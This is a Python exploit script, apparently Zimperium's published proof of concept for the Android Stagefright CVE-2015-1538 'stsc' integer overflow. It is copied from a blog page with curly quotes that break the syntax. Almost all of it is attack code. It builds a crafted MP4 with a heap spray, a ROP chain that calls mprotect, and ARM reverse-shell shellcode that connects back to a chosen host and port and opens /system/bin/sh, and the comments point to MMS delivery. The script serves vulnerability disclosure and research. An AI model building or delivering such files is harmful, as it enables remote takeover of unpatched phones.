#!/usr/bin/env python
# Joshua J. Drake (@jduck) of ZIMPERIUM zLabs
# Shout outs to our friends at Optiv (formerly Accuvant Labs)
# (C) Joshua J. Drake, ZIMPERIUM Inc, Mobile Threat Protection, 2015
# www.zimperium.com
#
# Exploit for RCE Vulnerability CVE-2015-1538 #1
# Integer Overflow in the libstagefright MP4 ‘stsc’ atom handling
#
# Don’t forget, the output of “create_mp4” can be delivered many ways!
# MMS is the most dangerous attack vector, but not the only one…
#
# DISCLAIMER: This exploit is for testing and educational purposes only. Any
# other usage for this code is not allowed. Use at your own risk.
#
# “With great power comes great responsibility.” – Uncle Ben
#
import struct
import socket
#
# Creates a single MP4 atom – LEN, TAG, DATA
#
def make_chunk(tag, data):
   if len(tag) != 4:
       raise ‘Yo! They call it “FourCC” for a reason.’
   ret = struct.pack(‘>L’, len(data) + 8)
   ret += tag
   ret += data
   return ret
#
# Make an ‘stco’ atom – Sample Table Chunk Offets
#
def make_stco(extra=”):
   ret =  struct.pack(‘>L’, 0) # version
   ret += struct.pack(‘>L’, 0) # mNumChunkOffsets
   return make_chunk(‘stco’, ret+extra)
#
# Make an ‘stsz’ atom – Sample Table Size
#
def make_stsz(extra=”):
   ret =  struct.pack(‘>L’, 0) # version
   ret += struct.pack(‘>L’, 0) # mDefaultSampleSize
   ret += struct.pack(‘>L’, 0) # mNumSampleSizes
   return make_chunk(‘stsz’, ret+extra)
#
# Make an ‘stts’ atom – Sample Table Time-to-Sample
#
def make_stts():
   ret =  struct.pack(‘>L’, 0) # version
   ret += struct.pack(‘>L’, 0) # mTimeToSampleCount
   return make_chunk(‘stts’, ret)
#
# This creates a single Sample Table Sample-to-Chunk entry
#
def make_stsc_entry(start, per, desc):
   ret = ”
   ret += struct.pack(‘>L’, start + 1)
   ret += struct.pack(‘>L’, per)
   ret += struct.pack(‘>L’, desc)
   return ret
#
# Make an ‘stsc’ chunk – Sample Table Sample-to-Chunk
#
# If the caller desires, we will attempt to trigger (CVE-2015-1538 #1) and
# cause a heap overflow.
#
def make_stsc(num_alloc, num_write, sp_addr=0x42424242, do_overflow = False):
   ret =  struct.pack(‘>L’, 0) # version/flags
   # this is the clean version…
   if not do_overflow:
       ret += struct.pack(‘>L’, num_alloc) # mNumSampleToChunkOffsets
       ret += ‘Z’ * (12 * num_alloc)
       return make_chunk(‘stsc’, ret)

   # now the explicit version. (trigger the bug)
   ret += struct.pack(‘>L’, 0xc0000000 + num_alloc) # mNumSampleToChunkOffsets
   # fill in the entries that will overflow the buffer
   for x in range(0, num_write):
       ret += make_stsc_entry(sp_addr, sp_addr, sp_addr)

   ret = make_chunk(‘stsc’, ret)

   # patch the data_size
   ret = struct.pack(‘>L’, 8 + 8 + (num_alloc * 12)) + ret[4:]

   return ret

#
# Build the ROP chain
#
# ROP pivot by Georg Wicherski! Thanks!
#
“””
(gdb) x/10i __dl_restore_core_regs
  0xb0002850 <__dl_restore_core_regs>: add r1, r0, #52 ; 0x34
  0xb0002854 <__dl_restore_core_regs+4>:   ldm r1, {r3, r4, r5}
  0xb0002858 <__dl_restore_core_regs+8>:   push    {r3, r4, r5}
  0xb000285c <__dl_restore_core_regs+12>:  ldm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11}
  0xb0002860 <__dl_restore_core_regs+16>:  ldm sp, {sp, lr, pc}
“””
“””
b0001144 <__dl_mprotect>:
b0001144:       e92d0090        push    {r4, r7}
b0001148:       e3a0707d        mov     r7, #125        ; 0x7d
b000114c:       ef000000        svc     0x00000000
b0001150:       e8bd0090        pop     {r4, r7}
b0001154:       e1b00000        movs    r0, r0
b0001158:       512fff1e        bxpl    lr
b000115c:       ea0015cc        b       b0006894 <__dl_raise+0x10>
“””
def build_rop(off, sp_addr, newpc_val, cb_host, cb_port):
   rop = ”
   rop += struct.pack(‘<L’, sp_addr + off + 0x10) # new sp
   rop += struct.pack(‘<L’, 0xb0002a98)           # new lr – pop {pc}
   rop += struct.pack(‘<L’, 0xb00038b2+1)         # new pc: pop {r0, r1, r2, r3, r4, pc}

   rop += struct.pack(‘<L’, sp_addr & 0xfffff000) # new r0 – base address (page aligned)
   rop += struct.pack(‘<L’, 0x1000)               # new r1 – length
   rop += struct.pack(‘<L’, 7)                    # new r2 – protection
   rop += struct.pack(‘<L’, 0xd000d003)           # new r3 – scratch
   rop += struct.pack(‘<L’, 0xd000d004)           # new r4 – scratch
   rop += struct.pack(‘<L’, 0xb0001144)           # new pc – _dl_mprotect

   native_start = sp_addr + 0x80
   rop += struct.pack(‘<L’, native_start)         # address of native payload
   #rop += struct.pack(‘<L’, 0xfeedfed5)          # top of stack…
   # linux/armle/shell_reverse_tcp (modified to pass env and fork/exit)
   buf =  ”
   # fork
   buf += ‘\x02\x70\xa0\xe3’
   buf += ‘\x00\x00\x00\xef’
   # continue if not parent…
   buf += ‘\x00\x00\x50\xe3’
   buf += ‘\x02\x00\x00\x0a’
   # exit parent
   buf += ‘\x00\x00\xa0\xe3’
   buf += ‘\x01\x70\xa0\xe3’
   buf += ‘\x00\x00\x00\xef’
   # setsid in child
   buf += ‘\x42\x70\xa0\xe3’
   buf += ‘\x00\x00\x00\xef’
   # socket/connect/dup2/dup2/dup2
   buf += ‘\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c’
   buf += ‘\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60’
   buf += ‘\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0’
   buf += ‘\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1’
   buf += ‘\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06’
   buf += ‘\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00’
   buf += ‘\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0’
   buf += ‘\xe3\x00\x00\x00\xef’
   # execve(shell, argv, env)
   buf += ‘\x30\x00\x8f\xe2\x04\x40\x24\xe0’
   buf += ‘\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d’
   buf += ‘\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00’
   buf += ‘\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00’
   buf += ‘\xef\x02\x00’
   # Add the connect back host/port
   buf += struct.pack(‘!H’, cb_port)
   cb_host = socket.inet_aton(cb_host)
   buf += struct.pack(‘=4s’, cb_host)
   # shell –
   buf += ‘/system/bin/sh\x00\x00’
   # argv –
   buf += ‘sh\x00\x00’
   # env –
   buf += ‘PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\x00’

   # Add some identifiable stuff, just in case something goes awry…
   rop_start_off = 0x34
   x = rop_start_off + len(rop)
   while len(rop) < 0x80 – rop_start_off:
       rop += struct.pack(‘<L’, 0xf0f00000+x)
       x += 4

   # Add the native payload…
   rop += buf

   return rop

#
# Build an mp4 that exploits CVE-2015-1538 #1
#
# We mimic meow.3gp here…
#
def create_mp4(sp_addr, newpc_val, cb_host, cb_port):
   chunks = []

   # Build the MP4 header…
   ftyp =  ‘mp42’
   ftyp += struct.pack(‘>L’, 0)
   ftyp += ‘mp42’
   ftyp += ‘isom’
   chunks.append(make_chunk(‘ftyp’, ftyp))

   # Note, this causes a few allocations…
   moov_data = ”
   moov_data += make_chunk(‘mvhd’,
       struct.pack(‘>LL’, 0, 0x41414141) +
       (‘B’ * 0x5c) )

   # Add a minimal, verified trak to satisfy mLastTrack being set
   moov_data += make_chunk(‘trak’,
       make_chunk(‘stbl’,
           make_stsc(0x28, 0x28) +
           make_stco() +
           make_stsz() +
           make_stts() ))

   # Spray the heap using a large tx3g chunk (can contain binary data!)
   “””
      0x4007004e <_ZNK7android7RefBase9decStrongEPKv+2>:   ldr r4, [r0, #4]  ; load mRefs
      0x40070050 <_ZNK7android7RefBase9decStrongEPKv+4>:   mov r5, r0
      0x40070052 <_ZNK7android7RefBase9decStrongEPKv+6>:   mov r6, r1
      0x40070054 <_ZNK7android7RefBase9decStrongEPKv+8>:   mov r0, r4
      0x40070056 <_ZNK7android7RefBase9decStrongEPKv+10>:  blx 0x40069884    ; atomic_decrement
      0x4007005a <_ZNK7android7RefBase9decStrongEPKv+14>:  cmp r0, #1        ; must be 1
      0x4007005c <_ZNK7android7RefBase9decStrongEPKv+16>:  bne.n   0x40070076 <_ZNK7android7RefBase9decStrongEPKv+42>
      0x4007005e <_ZNK7android7RefBase9decStrongEPKv+18>:  ldr r0, [r4, #8]  ; load refs->mBase
      0x40070060 <_ZNK7android7RefBase9decStrongEPKv+20>:  ldr r1, [r0, #0]  ; load mBase._vptr
      0x40070062 <_ZNK7android7RefBase9decStrongEPKv+22>:  ldr r2, [r1, #12] ; load method address
      0x40070064 <_ZNK7android7RefBase9decStrongEPKv+24>:  mov r1, r6
      0x40070066 <_ZNK7android7RefBase9decStrongEPKv+26>:  blx r2            ; call it!
   “””
   page = ”
   off = 0  # the offset to the next object
   off += 8
   page += struct.pack(‘<L’, sp_addr + 8 + 16 + 8 + 12 – 28)    # _vptr.RefBase (for when we smash mDataSource)
   page += struct.pack(‘<L’, sp_addr + off) # mRefs
   off += 16
   page += struct.pack(‘<L’, 1)             # mStrong
   page += struct.pack(‘<L’, 0xc0dedbad)    # mWeak
   page += struct.pack(‘<L’, sp_addr + off) # mBase
   page += struct.pack(‘<L’, 16)            # mFlags (dont set OBJECT_LIFETIME_MASK)
   off += 8
   page += struct.pack(‘<L’, sp_addr + off) # the mBase _vptr.RefBase
   page += struct.pack(‘<L’, 0xf00dbabe)    # mBase.mRefs (unused)
   off += 16
   page += struct.pack(‘<L’, 0xc0de0000 + 0x00)  # vtable entry 0
   page += struct.pack(‘<L’, 0xc0de0000 + 0x04)  # vtable entry 4
   page += struct.pack(‘<L’, 0xc0de0000 + 0x08)  # vtable entry 8
   page += struct.pack(‘<L’, newpc_val)          # vtable entry 12
   rop = build_rop(off, sp_addr, newpc_val, cb_host, cb_port)
   x = len(page)
   while len(page) < 4096:
       page += struct.pack(‘<L’, 0xf0f00000+x)
       x += 4

   off = 0x34
   page = page[:off] + rop + page[off+len(rop):]
   spray = page * (((2*1024*1024) / len(page)) – 20)
   moov_data += make_chunk(‘tx3g’, spray)
   block = ‘A’ * 0x1c
   bigger = ‘B’ * 0x40
   udta = make_chunk(‘udta’,
       make_chunk(‘meta’,
           struct.pack(‘>L’, 0) +
           make_chunk(‘ilst’,
               make_chunk(‘cpil’,    make_chunk(‘data’, struct.pack(‘>LL’, 21, 0) + ‘A’)) +
               make_chunk(‘trkn’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + ‘AAAABBBB’)) +
               make_chunk(‘disk’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + ‘AAAABB’)) +
               make_chunk(‘covr’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) * 32 +
               make_chunk(‘\xa9alb’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9ART’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘aART’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9day’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9nam’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9wrt’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘gnre’,    make_chunk(‘data’, struct.pack(‘>LL’, 1, 0) + block)) +
               make_chunk(‘covr’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) * 32 +
               make_chunk(‘\xa9ART’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + bigger)) +
               make_chunk(‘\xa9wrt’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + bigger)) +
               make_chunk(‘\xa9day’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + bigger)))
           )
       )
   moov_data += udta

   # Make the nasty trak
   tkhd1 = ”.join([
       ‘\x00’,       # version
       ‘D’ * 3,      # padding
       ‘E’ * (5*4),  # {c,m}time, id, ??, duration
       ‘F’ * 0x10,   # ??
       struct.pack(‘>LLLLLL’,
           0x10000,  # a00
           0,        # a01
           0,        # dx
           0,        # a10
           0x10000,  # a11
           0),       # dy
       ‘G’ * 0x14
       ])

   trak1 = ”
   trak1 += make_chunk(‘tkhd’, tkhd1)

   mdhd1 = ”.join([
       ‘\x00’,       # version
       ‘D’ * 0x17,   # padding
       ])

   mdia1 = ”
   mdia1 += make_chunk(‘mdhd’, mdhd1)
   mdia1 += make_chunk(‘hdlr’, ‘F’ * 0x3a)

   dinf1 = ”
   dinf1 += make_chunk(‘dref’, ‘H’ * 0x14)

   minf1 = ”
   minf1 += make_chunk(‘smhd’, ‘G’ * 0x08)
   minf1 += make_chunk(‘dinf’, dinf1)

   # Build the nasty sample table to trigger the vulnerability here.
   stbl1 = make_stsc(3, (0x1200 / 0xc) – 1, sp_addr, True) # TRIGGER

   # Add the stbl to the minf chunk
   minf1 += make_chunk(‘stbl’, stbl1)

   # Add the minf to the mdia chunk
   mdia1 += make_chunk(‘minf’, minf1)

   # Add the mdia to the track
   trak1 += make_chunk(‘mdia’, mdia1)

   # Add the nasty track to the moov data
   moov_data += make_chunk(‘trak’, trak1)

   # Finalize the moov chunk
   moov = make_chunk(‘moov’, moov_data)
   chunks.append(moov)

   # Combine outer chunks together and voila.
   data = ”.join(chunks)

   return data

if __name__ == ‘__main__’:
   import sys
   import mp4
   import argparse

   def write_file(path, content):
       with open(path, ‘wb’) as f:
           f.write(content)

   def addr(sval):
       if sval.startswith(‘0x’):
           return int(sval, 16)
       return int(sval)

   # The address of a fake StrongPointer object (sprayed)
   sp_addr   = 0x41d00010  # takju @ imm76i – 2MB (via hangouts)

   # The address to of our ROP pivot
   newpc_val = 0xb0002850 # point sp at __dl_restore_core_regs

   # Allow the user to override parameters
   parser = argparse.ArgumentParser()
   parser.add_argument(‘-c’, ‘–connectback-host’, dest=‘cbhost’, default=‘31.3.3.7’)
   parser.add_argument(‘-p’, ‘–connectback-port’, dest=‘cbport’, type=int, default=12345)
   parser.add_argument(‘-s’, ‘–spray-address’, dest=‘spray_addr’, type=addr, default=None)
   parser.add_argument(‘-r’, ‘–rop-pivot’, dest=‘rop_pivot’, type=addr, default=None)
   parser.add_argument(‘-o’, ‘–output-file’, dest=‘output_file’, default=‘cve-2015-1538-1.mp4’)
   args = parser.parse_args()

   if len(sys.argv) == 1:
       parser.print_help()
       sys.exit(–1)

   if args.spray_addr == None:
       args.spray_addr = sp_addr
   if args.rop_pivot == None:
       args.rop_pivot = newpc_val

   # Build the MP4 file…
   data = mp4.create_mp4(args.spray_addr, args.rop_pivot, args.cbhost, args.cbport)
   print(‘[*] Saving crafted MP4 to %s …’ % args.output_file)
   write_file(args.output_file, data) - See more at: https://blog.zimperium.com/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/#sthash.MbvoiMxd.dpuf